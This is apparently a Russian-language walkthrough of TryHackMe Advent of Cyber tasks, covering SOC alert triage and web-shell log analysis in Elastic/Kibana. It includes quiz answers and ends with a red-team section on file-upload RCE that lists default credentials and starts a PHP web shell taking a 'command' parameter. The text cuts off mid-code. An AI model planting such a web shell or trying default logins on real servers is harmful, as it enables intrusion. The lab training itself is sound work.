Mayor Malware
```
Каково количество коммитов в репозитории GitHub, где была поднята проблема?
```commandline
1
```
Если вам понравилось это задание, не стесняйтесь заглянуть в комнату OPSEC!
```commandline
Ответ не нужен
```
Что со всеми этими репозиториями GitHub? Могут ли они скрывать что-то еще?
```commandline
Ответ не нужен
```

## Задание 8
Это снова самое прекрасное время года, и это также самый напряженный день для команды Центра безопасности операций ( 
SOC ) Уэрвилла. Несмотря на подавляющие оповещения, генерируемые новыми и шумными правилами, аналитики SOC Уэрвилла 
обрабатывают их безостановочно, чтобы обеспечить безопасность города.

Однако аналитики SOC сейчас выгорают из-за всей необходимой нагрузки перед Рождеством. Многочисленные открытые дела 
все еще находятся на рассмотрении, и аналогичные оповещения продолжают срабатывать неоднократно, заставляя их думать 
о возможности ложных срабатываний из всего этого беспорядка.

Теперь помогите замечательной команде SOC Уорвилла проанализировать оповещения, чтобы определить, правдивы ли слухи 
о том, что вредоносная программа мэра сеет хаос в городе.

Истинно положительные или ложноположительные результаты?
В SOC события с разных устройств отправляются в SIEM , который является единственным источником истины, где 
агрегируются все данные и события. Определены определенные правила (правила инженерного обнаружения) для выявления 
вредоносной или подозрительной активности из этих событий. Если событие или набор событий удовлетворяет условиям 
правила, оно запускает оповещение. Затем аналитик SOC анализирует оповещение, чтобы определить, является ли 
оповещение истинно положительным (TP) или ложноположительным (FP). Оповещение считается TP, если оно содержит 
фактическую вредоносную активность. С другой стороны, если оповещение срабатывает из-за активности, которая на самом 
деле не является вредоносной, оно считается FP. Это может показаться очень простым в теории, но на практике 
разделение TP и FP может быть утомительной работой. Иногда может быть очень запутанным, чтобы отличить 
злоумышленника от системного администратора.

Определение истинных и ложных положительных результатов.

Принятие решения
Хотя и сложно различать TP и FP, очень важно сделать это правильно. Если TP ошибочно классифицирован как FP, это 
может привести к значительному воздействию от пропущенной кибератаки. Если FP ошибочно классифицирован как TP, 
драгоценное время будет потрачено на сосредоточение на FP, что может привести к меньшему сосредоточению на 
фактической атаке. Итак, как именно мы можем гарантировать, что мы выполняем эту важную работу эффективно? Мы можем 
использовать приведенные ниже указатели, чтобы направлять нас.

Панели мониторинга.Использование суперсилы SOC

У SOC есть суперсила. Когда они не уверены, выполняется ли действие злоумышленником или законным пользователем, они 
могут просто подтвердить это у пользователя. Эта привилегия недоступна злоумышленнику. Аналитик SOC , с другой 
стороны, может просто отправить электронное письмо или позвонить соответствующему лицу, чтобы получить подтверждение 
определенного действия. В зрелых организациях любые изменения, которые могут вызвать оповещение в SOC, часто требуют 
создания и утверждения запросов на изменение в процессе управления изменениями ИТ. В зависимости от процесса команда 
SOC может попросить пользователей поделиться подробностями запроса на изменение для подтверждения. Конечно, если это 
законное и одобренное действие, у него должен быть одобренный запрос на изменение.

Контекст

Хотя может показаться, что использование суперсилы SOC делает вещи суперлегкими, это не всегда так. Существуют 
случаи, которые могут действовать как Криптонит для суперсилы SOC:

- Если в организации не внедрен процесс подачи запросов на изменения.
- Выполненная деятельность выходила за рамки запроса на изменение или отличалась от утвержденного запроса на изменение.
- Действие вызвало оповещение, например, копирование файлов в определенное место, загрузка файла на какой-либо 
  веб-сайт или неудачная попытка входа в систему. 
- Инсайдер преднамеренно или непреднамеренно совершил действие, на которое у него нет полномочий.
- Пользователь выполнил вредоносную деятельность с помощью социальной инженерии, предоставленной злоумышленником.
В таких сценариях аналитику SOC очень важно понимать контекст деятельности и принимать решение на основе своих 
  аналитических навыков и знаний в области безопасности. При этом аналитик может изучить прошлое поведение 
  пользователя или распространенность определенного события или артефакта в организации или определенном отделе. 
  Например, если определенный пользователь из сетевой команды использует Wireshark, есть вероятность, что другие 
  пользователи из той же команды также используют Wireshark. Однако Wireshark, обнаруженный на машине, принадлежащей 
  кому-то из отдела кадров или финансов, должен по праву вызвать удивление.

Найти иголку в стоге сена. Корреляция

При построении контекста аналитик должен сопоставлять различные события, чтобы создать историю или временную шкалу. 
Корреляция подразумевает использование прошлых и будущих событий для воссоздания временной шкалы событий. При 
выполнении корреляции важно записывать некоторые важные артефакты, которые затем можно использовать для соединения 
точек. Эти важные артефакты могут включать IP-адреса, имена машин, имена пользователей, хэши, пути к файлам и т. д.

Корреляция требует создания множества гипотез и обеспечения того, чтобы доказательства подтверждали эту гипотезу. 
Гипотеза может быть чем-то вроде того, что пользователь загрузил вредоносное ПО с поддельного домена. 
Доказательством, подтверждающим это, могут быть журналы прокси-сервера, которые подтверждают гипотезу о том, что 
веб-сайт был посещен, веб-сайт использовал поддельное доменное имя, и определенный файл был загружен с этого 
веб-сайта. Теперь, предположим, мы хотим определить, было ли вредоносное ПО запущено через какую-то уязвимость в 
приложении или пользователь намеренно запустил вредоносное ПО. Чтобы увидеть это, мы можем посмотреть на 
родительский процесс вредоносного ПО и параметры командной строки, используемые для запуска указанного вредоносного 
ПО. Если родительский процесс — это проводник Windows, мы можем предположить, что пользователь запустил вредоносное 
ПО намеренно (или его могли обмануть, заставив запустить его с помощью социальной инженерии), но если родительский 
процесс — это веб-браузер или текстовый процессор, мы можем предположить, что вредоносное ПО не было запущено 
намеренно, а было запущено из-за уязвимости в указанном приложении.

Аналитики получили предупреждение.

#### Это TP или FP?
Подобно каждому SOC, аналитики в Wareville SOC также должны различать TP и FP. Это становится особенно сложным для 
них около Рождества, когда аналитики сталкиваются с усталостью от оповещений. В такие времена существует высокая 
вероятность неправильной классификации TP в FP и наоборот. Поэтому аналитики ценят любую помощь, которую они могут 
получить от нас в это критическое время. Чтобы усугубить ситуацию, офис мэра отправил аналитикам оповещение, 
информирующее их о нескольких закодированных командах PowerShell, запущенных в их системах. Возможно, мы сможем 
помочь с этим.

Подробности подключения

Карта подключения.

Чтобы помочь аналитикам, мы должны запустить Elastic SIEM в присоединенной виртуальной машине, нажав кнопку Start 
Machine  ниже. Инициализация экземпляра и появление страницы входа Elastic занимает 5 минут.


Запустить машину
После того, как машина будет запущена и заработает, мы сможем подключиться к Elastic SIEM , перейдя по адресу 
https://LAB_WEB_URL.p.thmlabs.com в вашем браузере, используя следующие учетные данные: 

Учетные данные TryHackMe
URL	https://LAB_WEB_URL.p.thmlabs.com
Имя пользователя	эластичный
Пароль	эластичный
После входа в систему мы можем нажать на меню в верхнем левом углу и перейти на Discover вкладку для просмотра событий. 

Инструкции по доступу к консоли Discover.

Согласно оповещению, отправленному мэрией, активность произошла 1 декабря 2024 года между 09:00 и 09:30. Мы можем 
установить это как наше временное окно, нажав на настройки временных рамок в правом верхнем углу. Обратите внимание, 
что нам нужно нажать на вкладку Absolute  и установить точные временные рамки, которые мы хотим просмотреть. Наконец,
нажмите кнопку Update,  чтобы применить изменения.

Инструкции по настройке временных рамок поиска.

После обновления настроек мы видим 21 событие в указанном временном интервале.

Первоначальные результаты запроса за указанный период времени.

В своей текущей форме эти события не выглядят очень легко читаемыми. Мы можем использовать поля в левой панели, 
чтобы добавлять столбцы к результатам и делать их более читаемыми. Наведение курсора на имя поля в левой панели 
позволит добавить это поле в качестве столбца, как показано ниже. 

Инструкции по добавлению полей в качестве столбцов таблицы.

Поскольку мы ищем события, связанные с PowerShell , нам хотелось бы узнать следующие подробности о журналах.

- Имя хоста, где была запущена команда. host.hostnameДля этого мы можем использовать поле как столбец.
- Пользователь, выполнивший действие. Мы можем добавить user.nameполе как столбец для этой информации.
- Мы добавим event.categoryполе, чтобы убедиться, что мы рассматриваем правильную категорию событий.
- Чтобы узнать, какие команды фактически выполняются с помощью PowerShell , мы можем добавить process.command_lineполе.
- Наконец, чтобы узнать, успешно ли выполнено действие, мы добавим event.outcomeполе.
После того, как мы добавим эти поля в качестве столбцов, мы увидим результаты в таком формате.

Вид после добавления столбцов полей.

Интересно! Итак, похоже, кто-то выполнил одну и ту же закодированную команду PowerShell на нескольких машинах. Еще 
один момент, который следует здесь отметить, заключается в том, что перед каждым выполнением команды PowerShell мы 
видим событие аутентификации, которое прошло успешно.

Аутентификация и шаблон выполнения PowerShell.

Похоже, в этом замешан Глитч.Эта активность наблюдается индивидуально на каждой машине, и разница во времени между 
входом в систему и командами PowerShell выглядит очень точной. Лучшие практики диктуют, что именованные учетные 
записи используются для любого вида административной деятельности, чтобы была подотчетность и атрибуция для каждой 
выполненной административной деятельности. Использование общей учетной записи администратора здесь также кажется 
подозрительным. На наш вопрос аналитики сообщили нам, что эта учетная запись используется двумя администраторами, 
которых не было в офисе, когда произошла эта деятельность. Хм, что-то определенно не так. Это какие-то проделки 
Glitch? Рождество в опасности? Нам нужно выяснить, кто запускал эти команды.

Давайте также добавим source.ipполе в качестве столбца, чтобы узнать, кто запускал команды PowerShell.

Добавление столбца поля source.ip к текущему представлению.

Поскольку source.ip поле доступно только для событий аутентификации, мы можем отфильтровать события процесса, чтобы 
увидеть, есть ли шаблон. Для этого мы можем навести курсор на event.categoryполе в одном из событий процесса. Мы 
увидим возможность фильтровать только для этого значения (знак +) или отфильтровать значение (знак -), как показано 
ниже. Давайте отфильтруем события аутентификации, нажав на знак плюс (+) рядом с ним, чтобы отобразить только те, 
которые есть в результатах.

Фильтрация с помощью кнопки «плюс».

В результате вы можете увидеть, что вывод отображает только события аутентификации. Поскольку результат не дает 
полезной информации, давайте удалим его на данный момент. Вы можете сделать это, нажав xрядом с фильтром.

Удаление фильтра с помощью кнопки x.

Поскольку временные рамки, которые мы ранее использовали, были для событий PowerShell, а события аутентификации 
могли поступать и раньше, нам нужно будет расширить поиск, чтобы понять контекст и исторические события для этого 
пользователя. Давайте посмотрим, есть ли у нас какие-либо события от пользователя с 29 ноября по 1 декабря. Обновляя 
временной фильтр для этих дней, результаты выглядят следующим образом.

Примечание: не забудьте снять event.categoryфильтр перед этим шагом.

Изменение временных рамок на 29 ноября – 1 декабря.

Ого, за эти три дня произошло более 6800 событий, и мы видим пик в конце журналов. Однако, даже несмотря на то, что 
мы использовали временной фильтр для конца дня 1 декабря, мы не видим никаких событий после успешного выполнения 
PowerShell.  Также в предыдущие дни было гораздо больше событий аутентификации, чем 1 декабря. 

Чтобы лучше понять события, давайте отфильтруем по нашим user.name with service_admin и source.ip with 10.0.11.11 , 
чтобы сузить поиск.

Применены фильтры по IP-адресу источника и имени пользователя.

Ой-ой! Похоже, все эти события исходят от одного и того же пользователя и одного IP-адреса. Нам определенно нужно 
провести дальнейшее расследование. Это также не объясняет всплеск. Давайте сначала отфильтруем события 
аутентификации, нажав кнопку плюс (+) рядом с ней.

Фильтрация событий аутентификации с помощью кнопки «плюс».

Более того, давайте отфильтруем здесь исходный IP, чтобы посмотреть, сможем ли мы найти IP-адрес, вызвавший скачок. 
Это можно сделать, нажав кнопку минус (-) рядом с ним.

Фильтрация исходного IP с помощью кнопки «минус».

После применения фильтров ожидаемый результат будет похож на изображение ниже.

Обновленные результаты на основе новых фильтров.

Прокручивая вниз, мы видим много событий для неудачных входов в систему. Мы также видим, что IP-адрес для всплеска 
(заканчивающийся на .255.1 ) отличается от того, который мы видели для событий, непрерывно поступающих в предыдущие 
дни (10.0.11.11). Аналитики ранее исследовали это и обнаружили, что скрипт с просроченными учетными данными вызывал 
эту проблему. Однако этот скрипт был обновлен с новым набором учетных данных. В любом случае, это может быть просто 
еще один скрипт. Давайте выясним.

Давайте удалим source IP фильтр, чтобы сосредоточиться на событиях аутентификации, близких к пику. После применения 
нового фильтра мы видим, что неудачные попытки входа прекратились через некоторое время после успешного входа с 
нового IP.

Паттерны аутентификации близки к пику.

Наши подозрения растут. Кажется, кто-то пытался провести атаку методом подбора 1 декабря, как показывают те же 
фильтры, что и выше.

Индикаторы попыток подбора.

Результаты также показали, что им удалось провести брутфорс-атаку из-за успешной попытки аутентификации и быстро 
запустить некоторые команды PowerShell на затронутых машинах. После запуска команд PowerShell мы не увидели 
дальнейших попыток входа. Это похоже на TP, и необходимо провести эскалацию, чтобы McSkidy мог помочь нам 
отреагировать на этот инцидент.


Рождество в опасности?
Сигнализация сработала, и МакСкиди был вызван, чтобы помочь разобраться в этом инциденте. Аналитики проинформировали 
МакСкиди об инциденте. МакСкиди заметил, что никто на самом деле не смотрел, что содержала команда PowerShell. 
Поскольку команда была закодирована, ее нужно расшифровать. МакСкиди изменил фильтры, event.category: process чтобы 
глубже изучить команды PowerShell.

Новый фильтр применен для просмотра команд PowerShell.

Мы видим команду PowerShell в process.command_lineполе. 
```commandline
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
```

McSkidy знает, что закодированные команды PowerShell обычно закодированы в Base64 и могут быть декодированы с 
помощью таких инструментов, как CyberChef . Поскольку команда может содержать некоторую конфиденциальную информацию 
и, следовательно, не должна быть отправлена на публичный портал, McSkidy запускает свой собственный экземпляр 
CyberChef, размещенный локально. McSkidy начала со вставки закодированной части команды в панель ввода в CyberChef.

Использование CyberChef для декодирования команды PowerShell.

Поскольку это команда в кодировке Base64, McSkidy использовал два рецепта, названные FromBase64 и Decode textиз 
левой панели. Обратите внимание, что McSkidy настроил текст Decode на UTF-16LE (1200) , поскольку это кодировка, 
используемая PowerShell для Base64.

Применение рецептов для декодирования команд PowerShell.

Результат принес облегчение Макскиди, который боялся, что Рождество испорчено. Кто-то пришел, чтобы помочь Макскиди 
и команде обеспечить свою оборону, но кто?

Злодей или герой?
McSkidy продолжил анализ тайного героя и пришел к поразительному открытию. Учетные данные для скрипта на машинах, 
которые запускали обновления Windows, были устаревшими. Кто-то взломал системы методом подбора и исправил учетные 
данные после успешного входа в систему. Это было очевидно из того факта, что каждой выполненной команде PowerShell 
предшествовал успешный вход с того же исходного IP-адреса, что приводило к неудачным входам в систему в течение 
последних нескольких дней. И что еще более поразительно? Именно Glitch получил доступ к ADM-01 и исправил учетные 
данные после того, как McSkidy подтвердил, кому принадлежит IP-адрес.

Доказательства того, что Glitch устранил повторяющуюся проблему.

Это означало, что жители Уорвилля неправильно поняли Глитча, который просто пытался помочь укрепить оборону. Но если 
Глитч помогал обороне, кто пытался ее саботировать? Мэр ли сообщил SOC об этих «подозрительных» командах PowerShell? 
Так же, как оповещения не всегда являются тем, чем кажутся в SOC, так же было и здесь, в Уорвилле, с людьми. Как и 
в случае с мэром и Глитчем, было сложно отличить TP от FP. Однако, возможно, Макскиди может использовать навыки 
дедукции на основе доказательств, полученные в SOC , чтобы облегчить жителям Уорвилля это различие.

### Ответьте на вопросы ниже
Каково имя учетной записи, вызывающей все неудачные попытки входа в систему?
```commandline
service_admin
```
Сколько было зафиксировано неудачных попыток входа в систему?
```commandline
6791
```
Какой IP-адрес у Glitch?
```commandline
10.0.255.1
```
Когда Glitch успешно вошел в ADM-01? Формат: MMM D, YYYY HH:MM:SS.SSS
```commandline
Dec 1, 2024 08:54:39.000
```
Какую расшифрованную команду выполняет Glitch для исправления систем Уорвилля?
```commandline
Install-WindowsUpdate -AcceptAll -AutoReboot
```
Если вам понравилось это задание, не стесняйтесь заглянуть в  комнату «Расследование с ELK 101»  .
```commandline
Ответ не нужен
```

## Задание 9
Сегодняшний вызов AoC следует за довольно неудачной серией событий для Glitch. Вот небольшой отрывок, который задает 
тон сегодняшнему заданию:  

Однажды поздним рождественским вечером у Глюка возникло чувство,
Он что-то забыл, глядя в потолок.
Он встал с кровати и решил проверить,
Записка на его стене: «Два дня! InsnowSec».

Одним щелчком мыши и нажатием кнопки он получил свой отель и билеты,
И уснул под звуки сверчков.
С багажом в руках он прибыл в Фрости Пайнс,
«Чтобы попасть на конференцию, просто следуйте указателям».

Как только он был готов, Глюк испугался,
Уязвимость RCE на их сайте?! ?
Он быстро воспользовался этим и сделал доклад,
Но прежде чем он успел отправить послание, прибыл его транспорт.

В центре Frosty Pines SOC они увидели сигнал тревоги,
Выглядело это очень плохо, они вызвали эксперта.
Запрос поступил из какой-то комнаты, но они не смогли определить, из какой именно.
Бревна спасли положение, это была комната… Глюка.


Графика отеля Frosty Pines

В этой задаче мы рассмотрим, как команда SOC и их эксперт смогли выяснить, что произошло (Операция Blue) и как 
Glitch вообще смог получить доступ к веб-сайту (Операция Red). Давайте начнем, не так ли?

#### Цели обучения
- Узнайте больше об анализе журналов и таких инструментах, как ELK .
- Узнайте о KQL и о том, как его можно использовать для исследования журналов с помощью ELK .
- Узнайте о RCE (удалённом выполнении кода) и о том, как это можно сделать с помощью незащищённой загрузки файлов.

Подключение к машине
Прежде чем двигаться дальше, ознакомьтесь с вопросами в карточке подключения ниже:

Необходимо запустить карту подключения AoC - виртуальную машину и AttackBox

Нажмите на зеленую Start Machine кнопку ниже, чтобы запустить виртуальную машину для практики. Практическая 
виртуальная машина может стать доступной через 5 минут. 


Запустить машину
Вам также нужно будет запустить AttackBox, нажав  Start AttackBox кнопку в верхней части комнаты. В качестве 
альтернативы вы можете подключить свою собственную хакерскую машину, используя TryHackMe VPN . 

ОПЕРАЦИЯ СИНИЙ
В этом разделе урока мы рассмотрим, какие инструменты и знания необходимы для синего сегмента, то есть для 
расследования самой атаки с использованием инструментов, позволяющих анализировать логи. 

В первой части Operation Blue мы продемонстрируем, как использовать ELK для анализа журналов демонстрационного 
веб-приложения - WareVille Rails. Не стесняйтесь следовать за нами для практики. 

Анализ логов и знакомство с ELK
Анализ журналов имеет решающее значение для работы синих команд, в чем вы, вероятно, убедились в ходе мероприятия 
Advent of Cyber этого года. 

Анализ журналов может быстро стать непосильной задачей, особенно если у вас есть несколько устройств и служб. ELK , 
или Elasticsearch, Logstash и Kibana, объединяет инструменты анализа и обработки данных, чтобы сделать анализ 
журналов гораздо более управляемым. ELK формирует выделенный стек, который может объединять журналы из нескольких 
источников в одном центральном месте.

Объяснение того, как ELK собирает и обрабатывает эти журналы, выходит за рамки сегодняшней задачи. Однако, если вы 
хотите узнать больше, вы можете посетить комнату Investigating with ELK 101.  На данный момент важно отметить, что 
несколько процессов за кулисами достигают этого.

Первая часть сегодняшнего задания — исследовать атаку на систему управления отелем Frosty Pines Resort, чтобы 
увидеть, как это выглядит для игрока Blue Team. Затем вы проверите свои навыки работы с веб-приложениями, воссоздав 
атаку.


Использование ELK
После загрузки URL-адреса http://MACHINE_IP:5601/ в браузере AttackBox вы увидите домашнюю страницу ELK .

Для сегодняшней задачи мы будем использовать интерфейс Discover Kibana  для просмотра журналов Apache2. Чтобы 
получить к нему доступ, просто нажмите на три линии, расположенные в верхнем левом углу страницы, чтобы открыть 
выдвижной лоток. Под заголовком Analytics нажмите на Discover.

Нажмите, чтобы открыть gif

Нам нужно будет выбрать коллекцию, которая имеет отношение к нам. Коллекция — это группа журналов. На этом этапе 
Operation Blue мы рассмотрим журналы, присутствующие в коллекции "wareville-rails". Чтобы выбрать эту коллекцию, 
щелкните раскрывающийся список слева от дисплея.

выбор шаблона индекса "wareville-rails" в ELK

После того, как вы это сделаете, вы увидите экран с надписью «Нет результатов, соответствующих вашим критериям 
поиска». Это потому, что за последние 15 минут не было загружено ни одного журнала. Не паникуйте; мы вскоре обсудим, 
как это изменить.

Открываем страницу поиска Kibana, после выбора коллекции, которую хотим использовать. Обратите внимание, что здесь 
не отображаются журналы, поскольку временной диапазон установлен на последние 15 минут.

Чтобы изменить дату и время, щелкните текст, расположенный справа от поля со значком календаря. Выберите « 
Абсолютный»  из раскрывающегося списка, где теперь можно выбрать начальную дату и время. Затем щелкните текст справа 
от стрелки и повторите процесс для конечной даты и времени.

Для коллекции WareVille Rails нам нужно будет установить время начала на 1 октября 2024 г. 00:00:00 и время 
окончания на 1 октября 23:30:00.

Если вы застряли, обратитесь к GIF-изображению ниже. Обратите внимание, что день и время в этой демонстрации 
WareVille Rails будут отличаться от времени, необходимого для обзора коллекции FrostyPines Resorts во второй 
половине практического занятия.

GIF-анимация, показывающая, как изменить временной диапазон в Kibana

Теперь, когда мы видим некоторые записи, давайте рассмотрим основы пользовательского интерфейса Kibana Discover.

Интерфейс обнаружения Kibana

- Панель поиска:  здесь мы можем размещать наши поисковые запросы с использованием  KQL.
- Шаблон индекса:  Шаблон индекса — это набор журналов. Это может быть определенный хост или, например, несколько 
  хостов с похожим назначением (например, несколько веб-серверов). В этом случае шаблон индекса — это все журналы, относящиеся к  " wareville-rail s"
- Поля:  эта панель показывает нам поля, которые  Elasticsearch  проанализировал из журналов. Например, временная 
  метка, тип ответа и IP-адрес. 
- Временная шкала:  эта визуализация отображает количество событий за определенный период времени.
- Документы (журналы):  эти записи представляют собой конкретные записи в файле журнала.
- Фильтр времени:  Мы можем использовать это, чтобы сузить определенный временной интервал (абсолютный). В качестве 
  альтернативы мы можем искать журналы на основе относительности. То есть  " Последние 7 дней ".

Язык запросов Kibana ( KQL )
KQL, или Kibana Query Language, — это простой в использовании язык, который можно использовать для поиска значений в 
документах. Например, для запроса о существовании значения в поле или его соответствии значению. Если вы знакомы со 
Splunk, вы можете подумать о SPL (Search Processing Language).

Например, запрос на поиск всех документов по IP-адресу может выглядеть так .  ip.address: "10.10.10.10"

Запрос IP-адреса

В качестве альтернативы Kibana также позволяет использовать запросы Lucene, продвинутый язык, который поддерживает 
такие функции, как нечеткие термины (поиск терминов, похожих на предоставленный), регулярные выражения и т. д. Для 
сегодняшнего задания мы будем использовать KQL, который включен по умолчанию. Таблица ниже содержит мини-шпаргалку 
по синтаксису KQL, которая может оказаться полезной для сегодняшнего задания.

Запрос/Синтаксис	Описание	Пример

- " "	Две кавычки используются для поиска определенных значений в документах. Значения в кавычках используются для 
точного  поиска.	"ПопробуйВзломатьМеня"
- *	Звездочка обозначает подстановочный знак, который ищет документы, похожие на указанное значение.	United* 
  (вернул бы United Kingdom и United States)
- ИЛИ	Этот логический оператор используется для отображения документов, содержащих  любое из предоставленных 
       значений.	«Соединенное Королевство» ИЛИ «Англия»
- И	Этот логический оператор используется для отображения документов, содержащих оба значения.	«Бен» И «25»
- :	Это используется для поиска (указанного) поля документа для значения, например IP-адреса. Обратите внимание, что 
  поле, которое вы здесь указываете, будет зависеть от полей, доступных в шаблоне индекса.	IP-адрес: 10.10.10.10

Расследование веб-атаки с помощью ELK
Сценарий: Благодаря нашим обширным возможностям обнаружения вторжений наши системы оповестили команду SOC о том, что 
1 октября 2024 года на платформу бронирования WareVille Rails загружается веб-шелл. Наша задача — просмотреть 
журналы веб-сервера, чтобы определить, как злоумышленник этого добился.

Если вы хотите следовать нашим инструкциям, убедитесь, что у вас выбрана коллекция « wareville-rails », как показано ниже:

выбор коллекции wareville-rails в ELK для продолжения этого этапа операции blue

Чтобы исследовать этот сценарий, давайте изменим временной фильтр, чтобы отобразить события за день атаки, установив 
начальную дату и время на « 1 октября 2024 г. в 00:00:00.000 » , а конечную дату и время на « 2 октября 2024 г. в 
00:00:00.000 » .

1-2 октября Диапазон дат

Вы увидите, что журналы теперь заполнены на дисплее. Обратите внимание, что количество записей (попаданий) в этой 
задаче может отличаться от количества на практической виртуальной машине.

Журналы

Невероятно полезной функцией ELK является то, что мы можем отфильтровывать шум. Веб-сервер (особенно популярный) 
скорее всего будет иметь большое количество журналов пользовательского трафика — совершенно не связанных с атакой. 
Используя панель полей слева, мы можем нажать на значки " + " и " - " рядом с полем, чтобы показать только это 
значение или убрать его с экрана соответственно.

Интересный факт: нажатие на эти фильтры на самом деле просто применяет соответствующий синтаксис KQL .

Обратите внимание на GIF ниже, как фильтруются журналы, чтобы показать только журналы, содержащие IP-адрес 10.13.27.
115 (уменьшая количество с 1028 до 423 попаданий). Мы можем объединить фильтрацию нескольких полей в или из, чтобы 
углубляться конкретно в журналы.

Фильтрация IP сужение gif

Чтобы удалить примененные фильтры, просто нажмите на значок « x » рядом с фильтром, прямо под строкой поиска.

Фильтрует изображение

В этом расследовании давайте рассмотрим активность IP-адреса 10.9.98.230.  Мы можем нажать на поле " clientip "  , 
чтобы увидеть IP-адреса с наибольшим количеством значений.

IP с наибольшим количеством значений

Используя временную шкалу вверху, мы можем видеть, что большая активность с этого IP-адреса имела место между 
11:30:00 и 11:35:00. Это было бы хорошим местом для начала нашего анализа.

Хронология сужена

Каждый журнал можно развернуть, используя  значок " > "  , расположенный слева от журнала/документа. К счастью, в 
этом случае журналы довольно маленькие, поэтому мы можем просмотреть их, чтобы найти что-нибудь подозрительное.

бревно

После некоторого копания выделяется несколько логов. Глядя на  поле запроса  , мы видим, что был получен доступ к 
файлу с именем "shell.php" с несколькими параметрами " c " и " d ", содержащими команды. Это, вероятно, команды, 
введенные в какую-то форму веб-шелла.

Журналы команд ввода веб-оболочки

Теперь, когда у нас есть начальная зацепка, давайте используем поисковый запрос, чтобы найти все журналы, содержащие 
" shell.php ". Используя строку поиска вверху, запрос message: "shell.php"будет искать все записи " shell.php " в 
поле сообщений журналов.

shell.php сузить

ОПЕРАЦИЯ КРАСНЫЙ
В этом разделе мы рассмотрим красный аспект. Другими словами, саму атаку и то, как она была осуществлена.


Почему веб-сайты разрешают загрузку файлов
Загрузка файлов происходит на всех веб-сайтах, и на то есть веские причины. Пользователям часто нужно загружать 
файлы, такие как фотографии профиля, счета-фактуры или другие документы, чтобы обновить свои учетные записи, 
отправить квитанции или подать претензии. Эти функции делают работу пользователя более гладкой и эффективной. Но 
хотя это удобно, это также создает риск, если загрузка файлов не обрабатывается должным образом. Если эта функция не 
защищена должным образом, она может открыть различные уязвимости, которыми могут воспользоваться злоумышленники.


Уязвимости загрузки файлов
Уязвимости загрузки файлов возникают, когда веб-сайт не обрабатывает файлы, которые загружают пользователи, должным 
образом. Если сайт не проверяет, какой тип файла загружается, насколько он большой или что он содержит, он открывает 
двери для всех видов атак. Например:

- RCE : загрузка скрипта, который запускается на сервере, дает злоумышленнику контроль над ним.
- XSS : загрузка HTML-файла, содержащего код XSS, который крадет cookie-файл и отправляет его обратно на сервер 
  злоумышленника.
Это может произойти, если сайт не обеспечивает надлежащую защиту функции загрузки файлов.


Почему неограниченная загрузка файлов опасна
Неограниченная загрузка файлов может быть особенно опасной, поскольку она позволяет злоумышленнику загружать файлы 
любого типа. Если содержимое файла не проверено должным образом, чтобы гарантировать, что принимаются только 
определенные форматы, такие как PNG или JPG, злоумышленник может загрузить вредоносный скрипт, например файл PHP или 
исполняемый файл, который сервер может обработать и запустить. Это может привести к выполнению кода на сервере, что 
позволит злоумышленникам захватить контроль над системой.

Примеры злоупотреблений посредством неограниченной загрузки файлов включают в себя:

- Загрузка скрипта, который выполняется сервером, что приводит к RCE .
- Загрузка специально созданного файла изображения, который вызывает уязвимость при обработке сервером.
- Загрузка веб-оболочки и прямой доступ к ней с помощью браузера.

Использование слабых учетных данных
Один из самых простых способов для злоумышленников проникнуть в систему — использовать слабые или стандартные 
учетные данные. Это может стать открытой дверью для злоумышленников, чтобы получить несанкционированный доступ. 
Стандартные учетные данные часто встречаются в системах, где администраторы не меняют начальные данные для входа, 
предоставленные во время настройки. Для злоумышленников попытка использовать несколько распространенных имен 
пользователей и паролей может привести к легкому доступу.

Ниже приведены некоторые примеры слабых/стандартных учетных данных, которые могут использовать злоумышленники:

Имя пользователя	Пароль
админ	админ
администратор	администратор
admin@имя_домена	админ
гость	гость
Злоумышленники могут использовать инструменты или вручную попытаться ввести эти общие учетные данные, и зачастую 
этого достаточно, чтобы взломать систему.


Что такое удаленное выполнение кода ( RCE )
Удаленное выполнение кода ( RCE ) происходит, когда злоумышленник находит способ запустить свой собственный код в 
системе. Это очень опасная уязвимость, поскольку она может позволить злоумышленнику взять под контроль систему, 
выкрасть конфиденциальные данные или скомпрометировать другие подключенные системы.

Графический ключ отеля Frosty Pines


Что такое веб-оболочка?
Веб-шелл — это скрипт, который злоумышленники загружают на уязвимый сервер, предоставляя им удаленный контроль над 
ним. После установки веб-шелла злоумышленники могут выполнять команды, манипулировать файлами и, по сути, 
использовать скомпрометированный сервер как свой собственный. Они даже могут использовать его для запуска атак на 
другие системы.

Например, злоумышленники могут использовать веб-шелл для:

- Выполнение команд на сервере
- Двигайтесь горизонтально в пределах сети
- Загрузите конфиденциальные данные или перейдите на другие сервисы
- Веб-оболочка обычно предоставляет злоумышленнику веб-интерфейс для запуска команд. Тем не менее, в некоторых случаях 
злоумышленники могут использовать обратную оболочку для установления прямого соединения со своей системой, что 
позволяет им удаленно управлять скомпрометированной машиной. Получив этот уровень доступа, злоумышленник может 
попытаться повысить привилегии, чтобы получить еще больше контроля, например, получить доступ root или проникнуть 
глубже в сеть. 

Хорошо, теперь, когда мы знакомы с уязвимостью удаленного выполнения кода и тем, как она работает, давайте посмотрим,
как мы могли бы ее эксплуатировать! 


Практика приводит к совершенству
Чтобы понять, как уязвимость загрузки файлов может привести к RCE, лучшим подходом будет получить практический опыт 
работы с ней. Удобный (и этичный) способ сделать это — найти и загрузить авторитетное веб-приложение с открытым 
исходным кодом, в котором эта уязвимость встроена. Многие проекты с открытым исходным кодом существуют в таких 
местах, как GitHub, которые можно запустить в вашей собственной среде для экспериментов и практики. В сегодняшнем 
задании мы продемонстрируем достижение RCE посредством неограниченной загрузки файлов в  системе управления железной 
дорогой с открытым исходным кодом , в  которой эта уязвимость  встроена.


Эксплуатация RCE через загрузку файлов
Теперь мы рассмотрим, как можно использовать эту уязвимость. Пока что вы можете просто читать, но возможность 
применить эти знания на практике появится. После того, как уязвимость RCE была идентифицирована, которую можно 
использовать через загрузку файла, нам нужно создать вредоносный файл, который позволит удаленное выполнение кода 
при загрузке.

Ниже приведен пример файла PHP , который можно загрузить для эксплуатации этой уязвимости. Используя ваш любимый 
текстовый редактор, скопируйте и вставьте приведенный ниже код и сохраните его как shell.php.

```commandline
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
